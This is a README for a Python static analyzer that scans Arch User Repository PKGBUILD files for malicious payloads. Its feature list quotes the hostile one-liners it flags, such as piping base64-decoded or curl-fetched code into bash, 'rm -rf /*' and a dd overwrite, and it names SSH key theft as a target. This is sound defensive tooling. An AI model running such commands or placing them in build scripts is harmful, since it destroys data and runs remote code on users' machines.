# AUR Sentinel

> A static analysis tool designed to scan Arch User Repository (AUR) `PKGBUILD` files for malicious payloads, obfuscated code, and security risks.

AUR Sentinel provides a focused security signal before you run `makepkg`. It acts as a defense mechanism against malicious actors attempting to deploy cryptominers, reverse shells, or system destruction commands via the community-driven AUR.

## Features

- **Deobfuscation Detection:** Identifies Base64 obfuscation techniques (e.g., `echo "..." | base64 -d | bash`).
- **Network Threat Detection:** Flags malicious external binary fetching (`curl -s http://unknown-ip | bash`).
- **Destructive Command Detection:** Detects system destruction commands (`rm -rf /*`, `dd if=/dev/zero`).
- **Unauthorized Execution:** Warns about execution from `/tmp` or `/dev/shm`.
- **Credential Theft Prevention:** Identifies SSH Key stealing attempts.
- **Risk Scoring:** Returns a comprehensive risk score (0 to 100) alongside matching source lines.

## Architecture

The tool is a read-only static analyzer written in Python. It evaluates the raw text of `PKGBUILD` scripts against a defined set of security signatures without ever executing the file. Future milestones will include fetching AUR snapshots, inspecting `.SRCINFO`, verifying source hashes, and generating machine-readable reports.

## Tech Stack

- **Language:** Python
- **Package Manager:** uv

## Getting Started

### Prerequisites

- Python 3.11+
- `uv` installed.

### Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/AspenQlio/aur-sentinel.git
   cd aur-sentinel
   ```
2. **Sync dependencies:**
   ```bash
   uv sync
   ```

## Usage

Run the scanner against a local `PKGBUILD` file:

```bash
uv run aur-sentinel scan ./PKGBUILD
```

*Note: AUR Sentinel provides a security signal, not a guarantee. Static signatures can produce false positives and false negatives. Always review every `PKGBUILD`, upstream source, maintainer history, and package comments before installation.*

## License

This project is licensed under the MIT License.
